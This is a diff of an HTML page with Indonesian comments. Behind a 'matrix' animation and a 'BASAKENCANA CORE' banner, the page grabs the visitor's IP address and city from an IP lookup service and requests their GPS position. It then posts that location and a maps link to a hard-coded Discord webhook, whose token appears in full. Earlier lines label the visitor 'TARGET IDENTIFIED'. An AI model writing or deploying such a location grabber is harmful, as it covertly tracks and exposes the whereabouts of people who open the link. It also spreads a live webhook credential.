@@ -7,36 +7,35 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
         
-        /* Matriks dipastikan di paling belakang tapi tetap terlihat */
+        /* Matriks sebagai background utama */
         #matrix {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
+            display: block;
+            z-index: 0; /* Paling belakang */
         }
 
-        /* Kotak info di atas matriks */
         #info {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 10;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0, 0, 0, 0.8);
             color: #0F0;
             padding: 20px;
-            border: 2px solid #0F0;
-            border-radius: 10px;
-            width: 300px;
+            border: 1px solid #0F0;
+            border-radius: 5px;
+            width: 280px;
             text-align: center;
-            box-shadow: 0 0 20px #0F0;
+            font-family: monospace;
+            pointer-events: none; /* Biar tidak ganggu klik */
         }
 
-        #map { height: 180px; width: 100%; margin-top: 10px; border: 1px solid #0F0; }
+        #map { height: 150px; width: 100%; margin-top: 10px; border: 1px solid #0F0; }
     </style>
 </head>
 <body>
@@ -44,52 +43,61 @@
 <canvas id="matrix"></canvas>
 
 <div id="info">
-    <h2 style="margin:0 0 10px 0;">SYSTEM ACTIVE</h2>
-    <p id="status">SCANNING...</p>
-    <p id="ip" style="font-size: 14px;"></p>
-    <p id="location" style="font-size: 14px;"></p>
+    <h3 style="margin:0;">BASAKENCANA CORE</h3>
+    <p id="status" style="font-size:12px;">INITIALIZING...</p>
+    <p id="ip" style="font-size:12px; margin:5px 0;"></p>
     <div id="map"></div>
 </div>
 
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
-
-// --- LOGIKA MATRIKS ---
+// --- 1. SETTING MATRIKS (JALAN DULUAN) ---
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+function setupCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+}
+setupCanvas();
+window.addEventListener('resize', setupCanvas);
 
-const chars = "0101010101";
+const letters = "0101010101".split("");
 const fontSize = 16;
 const columns = canvas.width / fontSize;
-const drops = Array.from({ length: columns }, () => 1);
+const drops = [];
+for (let i = 0; i < columns; i++) drops[i] = 1;
 
-function draw() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+function drawMatrix() {
+    // Efek luntur (hitam transparan)
+    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#0F0";
+
+    ctx.fillStyle = "#0F0"; // Warna hijau terang
     ctx.font = fontSize + "px monospace";
 
     for (let i = 0; i < drops.length; i++) {
-        const text = chars[Math.floor(Math.random() * chars.length)];
+        const text = letters[Math.floor(Math.random() * letters.length)];
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+        }
         drops[i]++;
     }
 }
-setInterval(draw, 33);
+// Jalankan animasi 30 frame per detik
+setInterval(drawMatrix, 40);
 
-// --- LOGIKA PELACAK ---
+// --- 2. SISTEM DISCORD & TRACKER ---
+const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+
 async function track() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
         
-        document.getElementById('status').innerText = "TARGET IDENTIFIED";
-        document.getElementById('ip').innerText = "IP: " + data.ip;
-        document.getElementById('location').innerText = "LOC: " + data.city;
+        document.getElementById('status').innerText = "CONNECTION ESTABLISHED";
+        document.getElementById('ip').innerText = "ID: " + data.ip;
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -101,27 +109,20 @@ async function track() {
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 L.marker([lat, lon]).addTo(map);
 
-                await send(data, mLink, "🎯 GPS");
-            }, async () => {
-                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                await send(data, mLink, "☁️ IP");
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ **Hujan Berhasil!**\n📍 Lokasi: ${data.city}\n🔗 Maps: ${mLink}`
+                    })
+                });
             });
         }
-    } catch (e) { console.error(e); }
+    } catch (e) { console.log("Error tracker:", e); }
 }
 
-async function send(data, mapsLink, metode) {
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            username: "BASAKENCANA",
-            content: `🚨 **DETEKSI BARU**\nIP: ${data.ip}\nKota: ${data.city}\nMetode: ${metode}\nMaps: ${mapsLink}`
-        })
-    });
-}
-
-track();
+// Jalankan pelacak 1 detik setelah matriks muncul
+setTimeout(track, 1000);
 </script>
 </body>
 </html>
